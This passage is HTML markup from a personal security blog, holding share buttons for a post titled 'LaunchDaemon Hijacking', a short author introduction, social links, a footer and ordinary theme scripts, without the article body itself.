        <a target="_blank" rel="noopener noreferrer" aria-label="share LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions on reddit"
            href="https://reddit.com/submit?url=https%3a%2f%2fbradleyjkemp.dev%2fpost%2flaunchdaemon-hijacking%2f&title=LaunchDaemon%20Hijacking%3a%20privilege%20escalation%20and%20persistence%20via%20insecure%20folder%20permissions">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions on facebook"
            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fbradleyjkemp.dev%2fpost%2flaunchdaemon-hijacking%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions on whatsapp"
            href="https://api.whatsapp.com/send?text=LaunchDaemon%20Hijacking%3a%20privilege%20escalation%20and%20persistence%20via%20insecure%20folder%20permissions%20-%20https%3a%2f%2fbradleyjkemp.dev%2fpost%2flaunchdaemon-hijacking%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions on telegram"
            href="https://telegram.me/share/url?text=LaunchDaemon%20Hijacking%3a%20privilege%20escalation%20and%20persistence%20via%20insecure%20folder%20permissions&amp;url=https%3a%2f%2fbradleyjkemp.dev%2fpost%2flaunchdaemon-hijacking%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=LaunchDaemon%20Hijacking%3a%20privilege%20escalation%20and%20persistence%20via%20insecure%20folder%20permissions&u=https%3a%2f%2fbradleyjkemp.dev%2fpost%2flaunchdaemon-hijacking%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
<article class="first-entry home-info">
    <header class="entry-header">
        <h1>Hi there, I&rsquo;m Bradley üëãüèª</h1>
    </header>
    <div class="entry-content">
        <p>Security engineer by day (and often by night too&hellip;)</p>
<p>This blog is where I try to share my mental models about security that I find useful.</p>
<p>You can follow what I&rsquo;m doing on any of these platforms below. Currently most active on <a href="https://bsky.app/profile/bradleyjkemp.dev">Bluesky</a></p>
<p>üëáüèª</p>

    </div>
    <footer class="entry-footer">
        <div class="social-icons" >
    <a href="https://bsky.app/profile/bradleyjkemp.dev" target="_blank" rel="noopener noreferrer me"
        title="Bluesky">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 360 320" fill="currentColor">
    <path
        d="M180 141.964C163.699 110.262 119.308 51.1817 78.0347 22.044C38.4971 -5.86834 23.414 -1.03207 13.526 3.43594C2.08093 8.60755 0 26.1785 0 36.5164C0 46.8542 5.66748 121.272 9.36416 133.694C21.5786 174.738 65.0603 188.607 105.104 184.156C107.151 183.852 109.227 183.572 111.329 183.312C109.267 183.642 107.19 183.924 105.104 184.156C46.4204 192.847 -5.69621 214.233 62.6582 290.33C137.848 368.18 165.705 273.637 180 225.702C194.295 273.637 210.76 364.771 295.995 290.33C360 225.702 313.58 192.85 254.896 184.158C252.81 183.926 250.733 183.645 248.671 183.315C250.773 183.574 252.849 183.855 254.896 184.158C294.94 188.61 338.421 174.74 350.636 133.697C354.333 121.275 360 46.8568 360 36.519C360 26.1811 357.919 8.61012 346.474 3.43851C336.586 -1.02949 321.503 -5.86576 281.965 22.0466C240.692 51.1843 196.301 110.262 180 141.964Z" />
</svg>
    </a>
    <a href="https://github.com/bradleyjkemp" target="_blank" rel="noopener noreferrer me"
        title="Github">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
    </a>
    <a href="https://www.linkedin.com/in/bradleyjkemp" target="_blank" rel="noopener noreferrer me"
        title="Linkedin">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
    <rect x="2" y="9" width="4" height="12"></rect>
    <circle cx="4" cy="4" r="2"></circle>
</svg>
    </a>
    <a href="https://querycal.com" target="_blank" rel="noopener noreferrer me"
        title="Querycal">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
</svg>
    </a>
    <a href="https://phish.report" target="_blank" rel="noopener noreferrer me"
        title="Phish.report">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
</svg>
    </a>
    <a href="https://bradleyjkemp.dev/index.xml" target="_blank" rel="noopener noreferrer me"
        title="Rss">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M4 11a9 9 0 0 1 9 9" />
    <path d="M4 4a16 16 0 0 1 16 16" />
    <circle cx="5" cy="19" r="1" />
</svg>
    </a>
</div>

    </footer>
</article>

















































</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="https://bradleyjkemp.dev">bradleyjkemp</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
